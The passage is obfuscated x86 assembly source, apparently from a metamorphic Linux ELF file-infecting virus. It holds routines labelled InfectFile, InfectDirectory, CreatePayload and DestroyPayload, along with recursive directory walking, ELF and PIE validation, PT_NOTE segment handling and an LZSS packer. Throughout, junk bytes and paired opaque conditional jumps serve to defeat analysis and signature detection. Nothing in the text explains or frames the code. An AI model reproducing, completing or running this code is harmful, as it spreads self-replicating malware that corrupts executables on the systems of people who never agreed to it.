    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+3
db 0xcf
    je          ..@T9Jjw6rKg5WH
    jne         ..@T9Jjw6rKg5WH
..@8TI8pLRyyz9L:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    jmp         $+5
db 0xbf, 0x89, 0x4c
    jmp         $+4
db 0xd3, 0x50
    jl          ..@iXlhLaWBaXn1
    jge         ..@iXlhLaWBaXn1
..@cHBrIBkLgoVX:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jmp         $+5
db 0xce, 0xce, 0x29
    jb          ..@HLdlnD92s7FX
    jae         ..@HLdlnD92s7FX
..@Egs1JIkX3bSo:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jmp         $+5
db 0x02, 0x6a, 0xe5
    js          ..@PU0sbR5fBVXP
    jns         ..@PU0sbR5fBVXP
..@nHdjWfiGAtQT:
    syscall
    test        eax, eax
    jnz         ..@lHA1dfwVsdfi
    jmp         $+3
db 0x0a
    jl          ..@0nAN7EFrqDC3
    jge         ..@0nAN7EFrqDC3
..@616NPtyqPn63:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    jb          ..@Sya94H1xCtd9
    jae         ..@Sya94H1xCtd9
..@BIOGBd0jmG7v:
    mov         ax, WORD [r1+linux_dirent.d_reclen]
    js          ..@JZSI56vJgarr
    jns         ..@JZSI56vJgarr
..@huxosuvGD6CT:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jmp         $+4
db 0x4c, 0x74
    jmp         ..@9P1WbWKHQH3G
..@DF2lhsewMw1E:
%ifdef X86_64
    mov         r10d, 0x01
    mov         r8d, DWORD [r8+file.filefd]
%endif
    jmp         $+5
db 0x36, 0xed, 0xc8
    jmp         ..@rufJA1mpg7vH
..@4kAGtYF209QB:
    syscall
    test        eax, eax
    jnz         ..@LJRX9uDEVLn3
    jmp         $+4
db 0xc1, 0x5a
    jb          ..@2DKso2BiCrTh
    jae         ..@2DKso2BiCrTh
..@7lt5UwcyllIx:
%ifdef X86_64
    xor         rax, rax
    xor         rdi, rdi
    xor         rdx, rdx
%endif
    jmp         $+3
db 0xe8
    js          ..@5a7S5yXSWwj2
    jns         ..@5a7S5yXSWwj2
..@QWOi7apm6q45:
    mov         r1, rax
    jl          ..@A9VKNpFY7riK
    jge         ..@A9VKNpFY7riK
..@3ic6DhI0ASvE:
    push        r5
    jmp         $+4
db 0xa3, 0xaa
    jl          ..@4mIu1UioB46k
    jge         ..@4mIu1UioB46k
..@VzwrAbq0mqaJ:
    pop         r5
    jmp         $+3
db 0x48
    js          ..@3hsRmOzXhkpT
    jns         ..@3hsRmOzXhkpT
DestroyPayload:
    jmp         ..@DLpNmgqGJ5R6
..@yQCo0WuuTd0F:
    xor         r2, r2
    jmp         $+4
db 0xf7, 0x9e
    jmp         $+5
db 0x04, 0xd0, 0xe1
    jmp         ..@BJf69DvPhaVt
..@rB4GETD5ifYp:
    cmp         rax, 0x00
    jmp         ..@Pmf2jTsNK6XL
..@YY3KMG19jVCY:
    ret
    jmp         $+3
db 0xb2
    jmp         CreatePayload
..@Y0SfeYiv2Pdo:
    and         r3, 0xfff 
    mov         rbx, 0x1000
    sub         rbx, r3
    jmp         $+3
db 0xac
    jmp         $+5
db 0x66, 0x5a, 0xa3
    jl          ..@DVJCJ6wds2pY
    jge         ..@DVJCJ6wds2pY
..@52zjtdLSJA99:
    add         rdi, rax
    xor         rax, rax
    jmp         $+4
db 0x24, 0x0c
    js          ..@gp0fvL6gHrJJ
    jns         ..@gp0fvL6gHrJJ
..@QjZtc1YaXCYW:
    xor         rcx, rcx
    je          ..@mD6Cxj3naRXn
    jne         ..@mD6Cxj3naRXn
..@PnKaLwI05pXi:
    test        eax, eax
    jnz         ..@YwG9ihM9qb21
    jmp         $+4
db 0xe0, 0xae
    jmp         ..@EPCScpJhypn6
..@7x8zIdwiS6Df:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jge         ..@euuEa0fW43Iv
    js          ..@VR9SyCt39z1P
    jns         ..@VR9SyCt39z1P
..@nyld1e4PlQBr:
    mov         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jb          ..@52zjtdLSJA99
    jae         ..@52zjtdLSJA99
..@js4SGjaxQUky:
    jz          ..@KaTG2Mzx4E9f
    cmp         BYTE [r1], 0x30
    jb          ..@IlgxZhqGE2pH
    jae         ..@IlgxZhqGE2pH
..@ePbeJMTCOGJ8:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    js          ..@1EJnDRu4grVx
    jns         ..@1EJnDRu4grVx
..@KFtTiQqgTfVn:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jge         ..@O14yMr9qd0CV
    jmp         $+3
db 0x87
    jl          ..@6f9XKeKC3fyE
    jge         ..@6f9XKeKC3fyE
..@ut20SMq2b2sr:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jl          ..@58ZAdBsY5v3m
    jmp         ..@nrmcUzOm62AS
    jmp         $+5
db 0xca, 0x87, 0xce
    jmp         $+3
db 0xcc
    jmp         ..@DcDtRgOg12Rm
..@FiKPaav11RK6:
    jle         ..@euuEa0fW43Iv
    jmp         $+4
db 0x8c, 0xe0
    jmp         ..@D73XcWd2C3dT
..@WKNafgZ3kLCX:
    jmp         ..@rD2cXF7ZO4YY
    jmp         $+3
db 0x08
    jmp         $+3
db 0x82
    jmp         ..@4BxzAjnCWS4s
..@HRMWWCOyFdG7:
    add         r1, 2
    js          ..@kz9sDqQCameL
    jns         ..@kz9sDqQCameL
..@1KoEGiYgOF3S:
    add         rsi, WINDOW_LENGTH
    rep         movsb
    jmp         $+3
db 0xf8
    jmp         $+4
db 0xab, 0x5e
    jmp         $+3
db 0xc4
    js          ..@EFJXOtiSfves
    jns         ..@EFJXOtiSfves
..@S5FKs9k29EgY:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    jmp         $+5
db 0xdc, 0x84, 0x7e
    jmp         $+4
db 0x6c, 0x20
    jl          ..@zmOSneguy62o
    jge         ..@zmOSneguy62o
..@iQftN2lmjBWW:
    rep         stosb
    jmp         $+5
db 0xe5, 0xe7, 0xb2
    jmp         $+4
db 0xa3, 0xcc
    jmp         $+5
db 0x2d, 0xf2, 0x3e
    jl          ..@qVphEtHpxWcs
    jge         ..@qVphEtHpxWcs
..@8Ab4behoWTyP:
    je          ..@bjzmvM4h4dFg
    jmp         $+3
db 0xfc
    jmp         $+4
db 0x60, 0x04
    jmp         ..@ZkxPH3idP5Oq
..@YWNw5OKqSvoa:
%ifdef X86_32
    pop         ebp
%endif
    jmp         ..@5zE66LUpYUst
..@l46LJYz4unQo:
    push        r1
    jmp         $+4
db 0x10, 0x20
    jl          ..@TbGj71un8pGT
    jge         ..@TbGj71un8pGT
..@x8mVuOrKh4f3:
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         $+5
db 0x54, 0x1c, 0x2e
    jmp         $+5
db 0xa4, 0x82, 0x53
    jmp         $+5
db 0x81, 0x7f, 0x3d
    jb          ..@Mrh0MoD2KLuS
    jae         ..@Mrh0MoD2KLuS
..@ivkBt6mNW3iJ:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+4
db 0xe4, 0x5e
    js          ..@zi1ZZHrxCJyH
    jns         ..@zi1ZZHrxCJyH
..@wfZJsal6p2cD:
    xor         rax, rax
    jmp         ..@tKdZEFRgeNtZ
..@wZ3gNGSXS9mq:
    add         r1, 1
    add         r2, 1
    jmp         Strcpy
    jb          ..@0gciQTYG20PJ
    jae         ..@0gciQTYG20PJ
..@Gi66SrK0YdF0:
    mov         r1, [rsp+_NBF_OFF.file]
    mov         r2, signature_len
    call        AddSizeMappedFile
    je          ..@2aaSVFWeZN2E
    jne         ..@2aaSVFWeZN2E
LzssEncoder:
    jmp         ..@vgrXkZk9d9co
..@sy7HgHpr7sqf:
    xor         r1, r1
    jmp         ..@fNSudO0Jcbl5
..@QgoEN2U9JQpb:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    jmp         $+4
db 0x1c, 0xfb
    jl          ..@SWqGghrXh8js
    jge         ..@SWqGghrXh8js
..@48sKL4SMcfeR:
    rep         movsb
    je          ..@t2VV5wOcTyqS
    jne         ..@t2VV5wOcTyqS
..@5a7S5yXSWwj2:
%ifdef X86_64
    xor         r9, r9
%endif
    jl          ..@w60nKevQPmVr
    jge         ..@w60nKevQPmVr
..@MfZ6he4x2IKp:
    cmp         BYTE [r5], DT_REG
    jb          ..@2yIwi554kd9P
    jae         ..@2yIwi554kd9P
..@VTPxk9lykrYx:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    js          ..@GL51aeMXrvkM
    jns         ..@GL51aeMXrvkM
DYNPIEValidation:
    jmp         ..@hXaZZP74TQGS
..@vULqIXN9JSsi:
    sub         rsp, _INFFILE_OFF_size
    mov         QWORD [rsp+_INFFILE_OFF.file+file.filename], r1
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+3
db 0x82
    jmp         $+5
db 0x7b, 0xb1, 0xac
    jmp         ..@6u57JzVvJWLE
..@kcyKEucwC1HK:
    push        0x00
    mov         rax, SYS_GETUID
    jmp         $+4
db 0x20, 0x2f
    jmp         ..@nHdjWfiGAtQT
..@COdNIXAjfRSb:
    add         rdi, rax
    jmp         $+5
db 0x4c, 0x98, 0xbb
    jl          ..@XHtCLPRFGDE8
    jge         ..@XHtCLPRFGDE8
..@t2ICBlD3q23b:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    js          ..@QgoEN2U9JQpb
    jns         ..@QgoEN2U9JQpb
..@aaNLw9LlpHTO:
    pop         r1
    js          ..@kOqOtiBUGYnC
    jns         ..@kOqOtiBUGYnC
..@eKzn1BW5MpxW:
    jz          ..@Bs41apZmHGw8
    jmp         $+5
db 0x7c, 0xdd, 0x81
    jmp         ..@JdTG9TjWqhmY
..@2u73pfP6UK9f:
    push        r4
    jl          ..@GTn0D750zTwj
    jge         ..@GTn0D750zTwj
..@8PHG4FxEohdQ:
    push        r1
    push        r2
    push        r3
    jmp         ..@4TTwcZBDJvu1
..@1EJnDRu4grVx:
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    jl          ..@yQFgUEq9ePlx
    jge         ..@yQFgUEq9ePlx
..@ACjEQquokkrs:
    cmp         BYTE [r2], 0x0
    je          ..@saSBHSM8RlE5
    jne         ..@saSBHSM8RlE5
..@ILFuuzyNwwVx:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         ..@SI1lEJhUeuOZ
..@B14Z6pbv97PY:
    mov         rax, rdi
    jb          ..@PUOjOK1p4ttG
    jae         ..@PUOjOK1p4ttG
..@DVJCJ6wds2pY:
    add         rax, rbx
    add         rsp, _VADDR_OFF_size
    pop         r1
    jb          ..@U4LC03WW1yCd
    jae         ..@U4LC03WW1yCd
..@054cato4LXbq:
    ret
    jmp         $+5
db 0x2f, 0xf5, 0x1b
    jl          FileValidation
    jge         FileValidation
..@LTuUYH2ylOf7:
    xor         rax, rax
    jmp         $+4
db 0xd9, 0x9a
    jmp         ..@ihwnYo1hhq3t
..@fLW0lOAiStvm:
    jne         ..@lsrxRNxO1dmY
    mov         r2, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x64, 0xc1, 0x8c
    jb          ..@b62JGoGb3HNZ
    jae         ..@b62JGoGb3HNZ
..@zi1ZZHrxCJyH:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         ..@KlGqrzMXt6gm
..@wgF4cJ2s18wR:
    add         r1, signature_len
    jmp         $+5
db 0x96, 0x1e, 0xad
    jb          ..@xEPTpcUrD2Kg
    jae         ..@xEPTpcUrD2Kg
..@ePI4vMzga5R1:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x40
    jl          ..@NjhDHRvwvtqN
    jge         ..@NjhDHRvwvtqN
..@YUarNTrxk736:
    pop         r2
    pop         r1
    jmp         $+5
db 0x4c, 0x37, 0xcb
    jmp         ..@7vaX2I0MykWJ
..@gp0fvL6gHrJJ:
    xor         rbx, rbx
    jl          ..@TLgFmr4pt3Wm
    jge         ..@TLgFmr4pt3Wm
..@AyUN2hpX3hVJ:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    cmp         BYTE [r1], '.'
    jl          ..@TYCrqD8y9aLB
    jge         ..@TYCrqD8y9aLB
..@DLpNmgqGJ5R6:
    xor         rax, rax
    jmp         $+4
db 0x9d, 0x4c
    jmp         ..@o8k4c1U1ZkLe
..@dEU9e7s2fJjp:
    xor         rdx, rdx
    jmp         ..@H5N9Wse746Gg
..@uhB4T9yYHOBi:
    mov         r1, r5
    jmp         $+3
db 0x27
    jmp         $+5
db 0xea, 0xbe, 0x0f
    js          ..@Jf3YEJY80kAR
    jns         ..@Jf3YEJY80kAR
..@pKysl2wLF12v:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         $+3
db 0x34
    jl          ..@FfxFhndU7bMs
    jge         ..@FfxFhndU7bMs
..@VvEpqiQ5nlEH:
    add         rsi, rdx
    mov         cl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    add         ecx, 1
    jmp         $+4
db 0x66, 0x0e
    jb          ..@bqOfxcL8j1z6
    jae         ..@bqOfxcL8j1z6
..@2U7pgjbVf5pd:
    and         eax, 0xff
    or          edi, eax
    jl          ..@SwFTvu0xO5k2
    jge         ..@SwFTvu0xO5k2
..@Tz071gMscT7I:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jl          ..@ILFuuzyNwwVx
    jge         ..@ILFuuzyNwwVx
..@n1S7xe2OADGy:
    cmp         WORD [r1], './'
    jmp         $+4
db 0x78, 0x2a
    jmp         $+4
db 0x68, 0xcf
    js          ..@QMwawIlEQSZE
    jns         ..@QMwawIlEQSZE
..@xggPZb98iCPw:
    je          ..@lsrxRNxO1dmY
    mov         rax, 2
    jl          ..@yfYzutYWRqnJ
    jge         ..@yfYzutYWRqnJ
..@4mIu1UioB46k:
    push        r2
    jmp         ..@5Zm5I8fLrIP2
..@oTU3rbr3VA5M:
    add         rsp, _NBF_OFF_size
    jmp         $+5
db 0x90, 0xd7, 0xd6
    jmp         ..@YY3KMG19jVCY
..@rn7kPe4N1PuQ:
    ret
    jmp         $+4
db 0x48, 0x5c
    jmp         InfectFile
..@IQENnfnKVMo5:
    mov         r2b, BYTE [rsp+_INFDIR_OFF.depth]
    add         r2, 1
    call        InfectDirectory
    jmp         $+4
db 0xa0, 0x8c
    jmp         ..@QWIMFFoewkp9
FileValidation:
    jmp         ..@gd98rcYricTG
..@fdZp2SP6azED:
    xor         rax, rax
    js          ..@84jEznymDDGp
    jns         ..@84jEznymDDGp
..@Kp01QP34HkWN:
    jne         ..@ka0jQnnnblRE
    jmp         $+4
db 0x99, 0x67
    js          ..@6ASJyskr16lF
    jns         ..@6ASJyskr16lF
Strcpy:
    jmp         ..@ACjEQquokkrs
..@G3ZtePNqPNu3:
    jmp         ..@AhYZ2QbGV74B
    jmp         $+4
db 0xfc, 0x54
    jb          ..@D5Wqi7wAM3ma
    jae         ..@D5Wqi7wAM3ma
..@ESiCsSHVmHIn:
    add         r4, 1
    jmp         $+3
db 0x63
    je          ..@SnrmcoGtRi9Y
    jne         ..@SnrmcoGtRi9Y
..@w60nKevQPmVr:
%ifdef X86_64
    mov         rsi, original_virus_len+PADDING
    mov         edx, 11b
    mov         r10, 0x22
%endif
    je          ..@g5nPp5NufSKl
    jne         ..@g5nPp5NufSKl
..@EiQxSn9l5KFR:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         ..@JVcwtL453T2T
..@2yIwi554kd9P:
    jne         ..@pKysl2wLF12v
    jb          ..@FDNITf5PjDoB
    jae         ..@FDNITf5PjDoB
..@6sMhifIxZAia:
    cmp         eax, 0x3
    jb          ..@4dnxtYuESPaq
    jae         ..@4dnxtYuESPaq
..@WEinlt0eDrNJ:
    mov         QWORD [rdi], rsi
    xor         rax, rax
    xor         rcx, rcx
    jl          ..@UoW918sKBxNt
    jge         ..@UoW918sKBxNt
..@mDCfi2PnMyIL:
    jmp         ..@OX1iWJ3FaBHB
    jb          ..@lHA1dfwVsdfi
    jae         ..@lHA1dfwVsdfi
..@ZJG6O1uUQ9iV:
    call        CreatePayload
    jmp         $+5
db 0xba, 0xdc, 0x97
    jl          ..@MgjANKaPl1LN
    jge         ..@MgjANKaPl1LN
..@UF9cGT9nbHh5:
    rep         movsb
    cld
    jb          ..@G3ZtePNqPNu3
    jae         ..@G3ZtePNqPNu3
..@s7mNbStXFytJ:
    mov         ecx, WINDOW_LENGTH
    jmp         $+3
db 0x74
    je          ..@QghO61EqL9cB
    jne         ..@QghO61EqL9cB
..@M2nY5bqDxRtj:
    jmp         ..@ihwnYo1hhq3t
    js          ..@vjEEbCmDhFFh
    jns         ..@vjEEbCmDhFFh
..@gQvvxN7q3uVp:
    mov         rax, r4
    js          ..@YJPKcIJIgDDd
    jns         ..@YJPKcIJIgDDd
..@mE78TPGUdYIr:
    mov         edx, 1
    jmp         $+4
db 0x83, 0x4d
    jmp         ..@xCtd1MYxnldF
..@kOqOtiBUGYnC:
    ret
    jmp         $+5
db 0x30, 0xfe, 0x25
    jl          WORDToDWORDASCII
    jge         WORDToDWORDASCII
..@aISdAxRTjYiM:
    mul         r3
    add         rax, p_h.p_type
    cmp         DWORD [r2+rax], PT_NOTE
    jmp         $+4
db 0xa7, 0x3b
    js          ..@teIXRbExsdIU
    jns         ..@teIXRbExsdIU
..@JZSI56vJgarr:
    add         r1, rax
    sub         r1, 1
    jmp         ..@FY6pjiMu0i8B
..@XYOxvfOeSK8B:
    cmp         r2, 0
    jmp         $+4
db 0xd2, 0x42
    je          ..@iDxKlYzNsuN4
    jne         ..@iDxKlYzNsuN4
..@fxcdh7nAPugj:
    mov         rax, SYS_FTRUNCATE
    syscall
    test        al, al
    jmp         ..@ALXjQ5AgVMpO
..@92nN44UNodNG:
    add         m7, rax
    mov         rdi, m6
    jmp         $+5
db 0x4c, 0x4c, 0x55
    jmp         ..@tvphuN1THXBF
..@0gciQTYG20PJ:
    ret
    jmp         $+5
db 0xc5, 0x49, 0xb1
    jmp         $+4
db 0xc9, 0x01
    jmp         $+5
db 0xbd, 0xe0, 0xc4
..@ZNUTDErLIkSX:
%ifdef X86_32
    mov         ecx, r3
%endif
    jl          ..@aINLPXnbONsS
    jge         ..@aINLPXnbONsS
..@pptnV0zp6suR:
    lea         r1, [rsp+_PROC_OFF.buffer]
    js          ..@izs06Jzt6tgb
    jns         ..@izs06Jzt6tgb
..@FsmAu6mYsZ8L:
    cmp         BYTE [r1+4], ELFCLASS
    jmp         $+4
db 0x6c, 0x94
    jb          ..@MMNkTspjPy41
    jae         ..@MMNkTspjPy41
..@y5oqMFwavmZD:
    sub         ebx, 1
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jge         ..@POieD0xhJdu5
    jb          ..@KFtTiQqgTfVn
    jae         ..@KFtTiQqgTfVn
..@PgQmpf1Jtj6c:
    mov         ecx, PADDING
    jmp         $+5
db 0xfb, 0x03, 0x74
    jl          ..@d4Eova5OMbXN
    jge         ..@d4Eova5OMbXN
..@ej65ZzKjvLsa:
    pop         r5
    jl          ..@QJekXI9B1FEY
    jge         ..@QJekXI9B1FEY
..@Bamjl3uaEZI2:
    push        r1
    jb          ..@uhB4T9yYHOBi
    jae         ..@uhB4T9yYHOBi
..@5RVJqyGzHlzo:
    jmp         ..@jVgWGHmGg8sU
    jmp         ..@O14yMr9qd0CV
..@6YT2VcLD84vT:
    add         r1, non_packed_len+PADDING
    jmp         $+3
db 0x61
    jmp         ..@ePcDwQE5E4H9
..@HqGJRUxtbm9g:
    jz          ..@lsrxRNxO1dmY
    jmp         ..@mdoONnvkenq3
..@QLDyIRAQVtcS:
    cmp         BYTE [r5], DT_DIR
    jne         ..@MfZ6he4x2IKp
    jmp         $+4
db 0xeb, 0x95
    js          ..@huxosuvGD6CT
    jns         ..@huxosuvGD6CT
..@CtcG4ensOHGo:
%ifdef X86_32
    mov         esi, r2
%endif
    jmp         $+5
db 0xb3, 0x6a, 0x66
    jmp         $+5
db 0x84, 0xe8, 0x1c
    jmp         ..@ZNUTDErLIkSX
..@ZkxPH3idP5Oq:
    cmp         BYTE [r1+16], ET_DYN
    jmp         $+5
db 0x9b, 0xc7, 0x32
    jl          ..@vBaK7cKGmvIL
    jge         ..@vBaK7cKGmvIL
..@DqWdiCKqXrZx:
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+5
db 0x9a, 0xab, 0x83
    jmp         ..@uhcQ4Roh9CJw
..@AhYZ2QbGV74B:
    pop         r5
    jmp         ..@ZrddbvLlbrJd
..@tYpBXhiT7uH5:
    xor         r4, r4
    jmp         $+5
db 0x37, 0xa5, 0x3d
    jmp         $+3
db 0x99
    jl          ..@O9zsmz7vGk1Q
    jge         ..@O9zsmz7vGk1Q
..@3FP61YZXVpfB:
    add         rsp, _DYNPIE_OFF_size
    pop         r2
    pop         r3
    jmp         $+3
db 0x03
    jmp         ..@oVCx4er5rGCq
..@77PdTXrq5sYZ:
    cmp         BYTE [r1], 0x00
    je          ..@uQqs81K0AI4f
    jmp         $+3
db 0x57
    jmp         ..@Bamjl3uaEZI2
..@NjhDHRvwvtqN:
    mov         r2, QWORD [r5+file.filesize]
    mov         rax, SYS_MUNMAP
    jb          ..@c09bVhX75nB0
    jae         ..@c09bVhX75nB0
..@vAHBVmtASHjp:
    sub         r2, 1
    jl          ..@Gd6cFRm7kHZN
    jge         ..@Gd6cFRm7kHZN
..@oTJlm0JwKNMX:
    je          ..@ZUdwnS592kxe
    js          ..@jJDowb06RRfm
    jns         ..@jJDowb06RRfm
..@p36lNEUiWvGf:
    call_vsp    ExitProgram
    jmp         $+3
db 0xf6
    jmp         ..@nRtImfModyJv
..@4TTwcZBDJvu1:
    mov         r1, r4
    mov         r2, m5
    jl          ..@ZJG6O1uUQ9iV
    jge         ..@ZJG6O1uUQ9iV
..@bevTeB47452q:
    jg          ..@FLCq9KmgNSsB
    jmp         $+4
db 0x34, 0xe5
    jb          ..@zoIUgqqBx2Ke
    jae         ..@zoIUgqqBx2Ke
..@wZrav6LPEbqq:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    je          ..@WaEEIpCaaTmf
    jne         ..@WaEEIpCaaTmf
..@BJf69DvPhaVt:
    xor         r3, r3
    js          ..@tYpBXhiT7uH5
    jns         ..@tYpBXhiT7uH5
..@RP2aG35z1M4L:
    xor         r3, r3
    js          ..@9dYDPlOQ1qqq
    jns         ..@9dYDPlOQ1qqq
..@2aaSVFWeZN2E:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, r1
    jmp         $+4
db 0x6c, 0xed
    jmp         $+4
db 0xed, 0x78
    jmp         ..@wgF4cJ2s18wR
..@CNomVVKX86Uz:
    mov         DWORD [r5+file.filefd], eax
    jmp         ..@ePD4omuMtgwB
..@vJD07H5GOYam:
    mov         r1, m6
    jmp         $+4
db 0xa7, 0xdf
    jmp         $+3
db 0x9f
    jmp         ..@OnITfync9t1X
..@iDxKlYzNsuN4:
    je          ..@HUhjopsW1qpk
    jmp         ..@8HixdbI99e65
..@0XgxzafaQmft:
    mov         WORD [rsp+_UPDATASIG_OFF.index], r2w
    GGLOBAL     _signature.start
    mov         rsi, r5
    jmp         ..@qrOmCuZBqPd6
..@XHtCLPRFGDE8:
    xor         rax, rax
    jb          ..@1YEJrEQ3c3Rs
    jae         ..@1YEJrEQ3c3Rs
..@qUYc19sDKmG6:
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@8rJYtOwNTCCE
..@J0cTxm5Z04sQ:
    call        InfectFile
    jmp         ..@pKysl2wLF12v
..@UoW918sKBxNt:
    mov         rdi, m7
    jb          ..@PgQmpf1Jtj6c
    jae         ..@PgQmpf1Jtj6c
..@5sdBo8hPKRyb:
    ret
    jmp         $+3
db 0x75
    jmp         GetNewProgramVaddr
..@mD6Cxj3naRXn:
    mov         ecx, signature_len
    jmp         $+5
db 0xe9, 0x33, 0x62
    jl          ..@M5yAUZFvIoos
    jge         ..@M5yAUZFvIoos
..@kwK632gyAST4:
    xor         rax, rax
    jmp         $+4
db 0x7c, 0x0c
    jmp         ..@0sBLE6lw0513
IsNum:
    jmp         ..@LTuUYH2ylOf7
..@ALXjQ5AgVMpO:
    jnz         ..@Ay0Bf7Fn2y08
    jmp         $+3
db 0x2e
    jmp         $+5
db 0x8f, 0xc1, 0x69
    jmp         $+5
db 0x0c, 0xce, 0xe5
    js          ..@fiQcplWSg65O
    jns         ..@fiQcplWSg65O
..@Bs41apZmHGw8:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jl          ..@sy7HgHpr7sqf
    jge         ..@sy7HgHpr7sqf
UnmapFile:
    jmp         ..@lD6mTKIgqZmi
..@EKKc3SU51hI1:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jmp         $+3
db 0x56
    js          ..@HbL75KFJcaug
    jns         ..@HbL75KFJcaug
..@cYkAzH0AcoVP:
    mov         rdi, m6
    jmp         ..@ULdlO5sCBaEo
..@8vlF52B1qVei:
    je          ..@Ay0Bf7Fn2y08
    mov         QWORD [r5+file.fileptr], rax
    mov         QWORD [r5+file.filesize], r3
    jmp         $+4
db 0xb8, 0xe1
    jmp         $+5
db 0xd9, 0x76, 0x41
    jb          ..@ual95S5jRqtH
    jae         ..@ual95S5jRqtH
..@320Wzi4DABiz:
    mov         edx, LOOKAHEAD_LENGTH
    cmp         ax, LOOKAHEAD_LENGTH
    cmovl       dx, ax
    jmp         ..@0UQVTgcJs5sR
..@DcDtRgOg12Rm:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jmp         $+5
db 0x92, 0x83, 0x14
    jb          ..@yPMZPERcrcUG
    jae         ..@yPMZPERcrcUG
..@xCtd1MYxnldF:
    shl         edx, POSITION_BITS+LENGTH_BITS
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    jmp         ..@0ROco8XYMcgp
..@mdoONnvkenq3:
    and         r2, 1b
    jmp         $+3
db 0x7c
    jl          ..@ln0Rik1zYHIz
    jge         ..@ln0Rik1zYHIz
..@QIFNOHBegV8C:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         ..@hWAu9P1sO9kb
..@Wueh5ufWGc4A:
    je          ..@pKysl2wLF12v
    jmp         $+3
db 0x38
    jmp         $+5
db 0x78, 0x0c, 0x28
    je          ..@spOGFvUt5fd3
    jne         ..@spOGFvUt5fd3
..@UlnagV2qeBVj:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         $+3
db 0x4d
    jmp         ..@XoZL0fvr8HJX
..@cCPucnqVfrIj:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    jl          ..@BDEk2VWBSnzH
    jmp         $+5
db 0xe8, 0xe0, 0xba
    js          ..@qnAfwFfZP4Rz
    jns         ..@qnAfwFfZP4Rz
..@ZUdwnS592kxe:
    mov         r1, [rsp+_INFFILE_OFF.file+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_phoff]
    jl          ..@vinhmRIJvtGj
    jge         ..@vinhmRIJvtGj
..@xwpcULTOrJZO:
    syscall
    js          ..@0Fr7A6CYEBO0
    jns         ..@0Fr7A6CYEBO0
..@V6EBjfRBvj0g:
    cmp         r1, e_h_size
    jge         ..@glpZTnE4Q9X4
    cmp         r1, 0x00
    jmp         $+5
db 0x41, 0xcd, 0x13
    jmp         ..@bevTeB47452q
..@PU0sbR5fBVXP:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         ..@y5oqMFwavmZD
..@BqrBvFU1il9X:
    mov         r1, m6
    jmp         $+3
db 0x30
    jmp         $+4
db 0x2a, 0x79
    jmp         ..@6YT2VcLD84vT
..@SnrmcoGtRi9Y:
    jmp         ..@3302X8uI8jY1
    jb          ..@Bs41apZmHGw8
    jae         ..@Bs41apZmHGw8
..@bjzmvM4h4dFg:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_entry]
    jmp         ..@Nrs5Qzzzgwlb
..@tzF2sdVqQfEW:
    call_vsp    GetEnv
    test        rax, rax
    jz          ..@6LbVzp1rGMXw
    jmp         $+5
db 0x98, 0x2e, 0x4b
    jl          ..@sTNggXhmKe56
    jge         ..@sTNggXhmKe56
..@QJekXI9B1FEY:
    pop         r4
    jb          ..@DYH8r9hIF0lI
    jae         ..@DYH8r9hIF0lI
..@HLdlnD92s7FX:
    add         r4, rax
    jmp         ..@ut20SMq2b2sr
AddSizeMappedFile:
    jmp         ..@TLQksCwlsS6m
..@ZZcEz2nWKggd:
    add         WORD [rsp+_LZSSE_OFF.buffersize], cx
    jmp         $+3
db 0x38
    jmp         $+4
db 0x6e, 0x70
    jmp         ..@48sKL4SMcfeR
..@CSjfQY8M95dR:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jl          ..@ehFobrxPjNph
    jl          ..@gUlQEPT1UqNB
    jge         ..@gUlQEPT1UqNB
..@Pe5JlxJEsV3g:
    jne         ..@ERlzDxHmndSk
    jmp         $+4
db 0x90, 0xba
    js          ..@ERlzDxHmndSk
